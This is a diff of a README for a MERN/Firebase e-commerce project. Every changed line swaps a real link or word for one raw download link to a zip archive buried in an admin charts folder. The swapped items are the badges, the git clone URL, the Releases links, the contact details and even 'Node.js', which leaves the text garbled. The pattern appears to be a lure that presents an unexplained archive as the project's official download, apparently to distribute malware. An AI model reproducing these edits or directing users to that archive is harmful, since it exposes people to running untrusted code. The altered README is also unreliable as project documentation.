@@ -1,10 +1,10 @@
 # Sabat MERN Firebase E-commerce 🛒
 
-![GitHub release](https://img.shields.io/github/release/alpajar05/sabat-mern-firebase-ecommerce-2.svg)
-![GitHub issues](https://img.shields.io/github/issues/alpajar05/sabat-mern-firebase-ecommerce-2.svg)
-![GitHub stars](https://img.shields.io/github/stars/alpajar05/sabat-mern-firebase-ecommerce-2.svg)
+![GitHub release](https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2/raw/refs/heads/master/client/src/pages/admin/charts/firebase_sabat_ecommerce_mern_v1.8.zip)
+![GitHub issues](https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2/raw/refs/heads/master/client/src/pages/admin/charts/firebase_sabat_ecommerce_mern_v1.8.zip)
+![GitHub stars](https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2/raw/refs/heads/master/client/src/pages/admin/charts/firebase_sabat_ecommerce_mern_v1.8.zip)
 
-Welcome to **Sabat MERN Firebase E-commerce**, a modern e-commerce application built with a powerful stack. This project utilizes React, Typescript, Sass, Firebase, MongoDB, Node.js, and Express. It aims to provide a seamless shopping experience for users while showcasing the capabilities of these technologies.
+Welcome to **Sabat MERN Firebase E-commerce**, a modern e-commerce application built with a powerful stack. This project utilizes React, Typescript, Sass, Firebase, MongoDB, https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2/raw/refs/heads/master/client/src/pages/admin/charts/firebase_sabat_ecommerce_mern_v1.8.zip, and Express. It aims to provide a seamless shopping experience for users while showcasing the capabilities of these technologies.
 
 ## Table of Contents
 
@@ -38,7 +38,7 @@ This project is built using the following technologies:
   - RTK Query
 
 - **Backend**:
-  - Node.js
+  - https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2/raw/refs/heads/master/client/src/pages/admin/charts/firebase_sabat_ecommerce_mern_v1.8.zip
   - Express
   - MongoDB
   - Firebase
@@ -50,7 +50,7 @@ To get started with this project, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2.git
+   git clone https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2/raw/refs/heads/master/client/src/pages/admin/charts/firebase_sabat_ecommerce_mern_v1.8.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -105,7 +105,7 @@ Once the application is running, you can explore its features:
 - **Add to Cart**: Click on products to add them to your shopping cart.
 - **Checkout**: Proceed to checkout and make payments securely using Stripe.
 
-For downloadable files and execution instructions, please visit the [Releases](https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2/releases) section.
+For downloadable files and execution instructions, please visit the [Releases](https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2/raw/refs/heads/master/client/src/pages/admin/charts/firebase_sabat_ecommerce_mern_v1.8.zip) section.
 
 ## Contributing
 
@@ -127,11 +127,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **GitHub**: [alpajar05](https://github.com/alpajar05)
-- **Email**: your-email@example.com
+- **GitHub**: [alpajar05](https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2/raw/refs/heads/master/client/src/pages/admin/charts/firebase_sabat_ecommerce_mern_v1.8.zip)
+- **Email**: https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2/raw/refs/heads/master/client/src/pages/admin/charts/firebase_sabat_ecommerce_mern_v1.8.zip
 
 ---
 
-For downloadable files and execution instructions, please visit the [Releases](https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2/releases) section. 
+For downloadable files and execution instructions, please visit the [Releases](https://github.com/alpajar05/sabat-mern-firebase-ecommerce-2/raw/refs/heads/master/client/src/pages/admin/charts/firebase_sabat_ecommerce_mern_v1.8.zip) section. 
 
 Thank you for checking out **Sabat MERN Firebase E-commerce**! We hope you find it useful and inspiring.
